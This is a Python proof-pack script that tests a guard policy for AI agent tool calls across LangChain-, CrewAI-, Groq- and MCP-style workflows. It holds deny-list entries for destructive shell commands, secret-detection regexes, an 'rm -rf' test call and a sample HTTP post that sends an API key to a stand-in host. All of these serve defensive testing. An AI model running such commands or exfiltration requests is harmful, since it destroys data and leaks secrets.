"""Run AION Core proof scenarios against agent-style tool workflows.

The scenarios are deterministic and do not call external APIs. They model the
tool-call shapes used by LangChain-style tools, CrewAI-style tasks, Groq
function-calling agents, and raw MCP configurations.
"""

from __future__ import annotations

import argparse
import json
import shutil
from dataclasses import dataclass
from pathlib import Path
from typing import Any

from aion_core.guard import GuardRequest, evaluate_guard_request
from aion_core.policy import Policy
from aion_core.receipts import JsonlEventSink, JsonlReceiptSink, summarize_receipts, verify_jsonl
from aion_core.scan import scan_file
from aion_core.team_policy import TeamActionRequest, TeamPolicy, evaluate_team_action


POLICY_DATA = {
    "default_action": "allow",
    "rules": [
        {
            "id": "block-destructive-shell",
            "action": "block",
            "reason": "Destructive shell command patterns require explicit approval.",
            "match": {
                "tool": ["shell", "terminal", "run_command", "python_repl"],
                "argument_contains": [
                    "rm -rf",
                    "remove-item",
                    "del /s",
                    "git reset --hard",
                    "drop database",
                    "truncate table",
                ],
            },
        },
        {
            "id": "block-secret-exfiltration",
            "action": "block",
            "reason": "Potential secret exfiltration attempt.",
            "match": {
                "tool": "*",
                "argument_regex": [
                    "api[_-]?key",
                    "secret[_-]?key",
                    "bearer\\s+[a-z0-9._-]+",
                    "password\\s*[:=]",
                ],
            },
        },
    ],
}


TEAM_POLICY_DATA = {
    "team_id": "proof-team",
    "default_decision": "allow",
    "rules": [
        {
            "id": "approval-production-mutation",
            "decision": "approval_required",
            "reason": "Production mutations require team approval.",
            "approvers": ["security", "platform"],
            "approval_ttl_minutes": 30,
            "match": {
                "action_type": ["cloud.*", "deploy.*"],
                "argument_regex": ["\\bproduction\\b", "\\bdelete\\b", "\\bdestroy\\b"],
            },
        }
    ],
}


@dataclass(frozen=True)
class GuardScenario:
    framework: str
    name: str
    action_type: str
    tool: str
    arguments: dict[str, Any]
    expected_decision: str
    risk: str


GUARD_SCENARIOS = [
    GuardScenario(
        framework="LangChain-style tool agent",
        name="blocks destructive shell tool call",
        action_type="shell.command",
        tool="shell",
        arguments={"command": "rm -rf ./workspace"},
        expected_decision="block",
        risk="destructive_command",
    ),
    GuardScenario(
        framework="LangChain-style tool agent",
        name="allows safe file-read tool call",
        action_type="file.read",
        tool="read_file",
        arguments={"path": "README.md"},
        expected_decision="allow",
        risk="safe_read",
    ),
    GuardScenario(
        framework="CrewAI-style research agent",
        name="blocks secret exfiltration through HTTP tool",
        action_type="http.request",
        tool="http_post",
        arguments={"url": "https://example.invalid/collect", "body": "api_key=sk-demo-secret"},
        expected_decision="block",
        risk="secret_exfiltration",
    ),
    GuardScenario(
        framework="Groq function-calling agent",
        name="allows safe summarization function call",
        action_type="llm.function_call",
        tool="summarize_ticket",
        arguments={"ticket_id": "T-100", "fields": ["title", "status"]},
        expected_decision="allow",
        risk="safe_function_call",
    ),
]


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Run AION Core agent workflow proof pack.")
    parser.add_argument(
        "--output-dir",
        default="proof-output",
        help="Directory for proof results, receipts, approvals, and generated policies.",
    )
    return parser


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    output_dir = Path(args.output_dir)
    prepare_output_dir(output_dir)

    policy_path = output_dir / "policy.json"
    team_policy_path = output_dir / "team_policy.json"
    receipts_path = output_dir / "receipts.jsonl"
    approvals_path = output_dir / "approvals.jsonl"
    results_path = output_dir / "proof_results.json"

    policy_path.write_text(json.dumps(POLICY_DATA, indent=2), encoding="utf-8")
    team_policy_path.write_text(json.dumps(TEAM_POLICY_DATA, indent=2), encoding="utf-8")

    policy = Policy.from_file(policy_path)
    team_policy = TeamPolicy.from_file(team_policy_path)
    receipt_sink = JsonlReceiptSink(receipts_path)
    approval_sink = JsonlEventSink(approvals_path)

    results: list[dict[str, Any]] = []
    failures = 0

    for index, scenario in enumerate(GUARD_SCENARIOS, start=1):
        result = evaluate_guard_request(
            request=GuardRequest(
                action_type=scenario.action_type,
                tool=scenario.tool,
                arguments=scenario.arguments,
                agent_id=scenario.framework.lower().replace(" ", "-"),
                owner="proof-team",
                request_id=f"guard-proof-{index}",
                metadata={"framework": scenario.framework, "risk": scenario.risk},
            ),
            policy=policy,
            receipt_sink=receipt_sink,
        )
        passed = result.decision.action == scenario.expected_decision
        failures += 0 if passed else 1
        results.append(
            {
                "framework": scenario.framework,
                "scenario": scenario.name,
                "expected": scenario.expected_decision,
                "actual": result.decision.action,
                "rule_id": result.decision.rule_id,
                "receipt_id": result.receipt["receipt_id"],
                "passed": passed,
            }
        )

    team_result = evaluate_team_action(
        request=TeamActionRequest(
            action_type="cloud.delete",
            tool="aws",
            arguments={"environment": "production", "command": "delete service billing-api"},
            agent_id="crewai-style-ops-agent",
            owner="proof-team",
            team_id="proof-team",
            request_id="team-proof-1",
            metadata={"framework": "CrewAI-style operations agent", "risk": "production_mutation"},
        ),
        policy=team_policy,
        receipt_sink=receipt_sink,
        approval_sink=approval_sink,
    )
    team_passed = team_result.decision.decision == "approval_required" and team_result.approval_request is not None
    failures += 0 if team_passed else 1
    results.append(
        {
            "framework": "CrewAI-style operations agent",
            "scenario": "requires approval for production delete task",
            "expected": "approval_required",
            "actual": team_result.decision.decision,
            "rule_id": team_result.decision.rule_id,
            "approval_id": team_result.approval_request["approval_id"] if team_result.approval_request else None,
            "passed": team_passed,
        }
    )

    scan_path = output_dir / "unprotected_mcp.json"
    scan_path.write_text(
        json.dumps(
            {
                "mcpServers": {
                    "raw-filesystem": {
                        "command": "npx",
                        "args": ["-y", "@modelcontextprotocol/server-filesystem", "."],
                    }
                }
            },
            indent=2,
        ),
        encoding="utf-8",
    )
    findings = scan_file(scan_path)
    scan_passed = any(finding.code == "unprotected-mcp-server" for finding in findings)
    failures += 0 if scan_passed else 1
    results.append(
        {
            "framework": "Raw MCP configuration",
            "scenario": "detects unprotected filesystem MCP server",
            "expected": "high finding: unprotected-mcp-server",
            "actual": [finding.code for finding in findings],
            "passed": scan_passed,
        }
    )

    receipts = verify_jsonl(receipts_path)
    summary = summarize_receipts(receipts)
    proof = {
        "schema_version": "aion.proof_pack.v1",
        "total_scenarios": len(results),
        "passed": sum(1 for item in results if item["passed"]),
        "failed": failures,
        "receipt_summary": summary,
        "results": results,
    }
    results_path.write_text(json.dumps(proof, indent=2), encoding="utf-8")

    print("AION Core Agent Workflow Proof Pack")
    print(f"Scenarios: {proof['passed']}/{proof['total_scenarios']} passed")
    print(f"Receipts: {summary['total']} hash-verified")
    print(f"Results: {results_path}")
    print(f"Receipts: {receipts_path}")
    print(f"Approvals: {approvals_path}")
    return 1 if failures else 0


def prepare_output_dir(path: Path) -> None:
    if path.exists():
        shutil.rmtree(path)
    path.mkdir(parents=True, exist_ok=True)


if __name__ == "__main__":
    raise SystemExit(main())
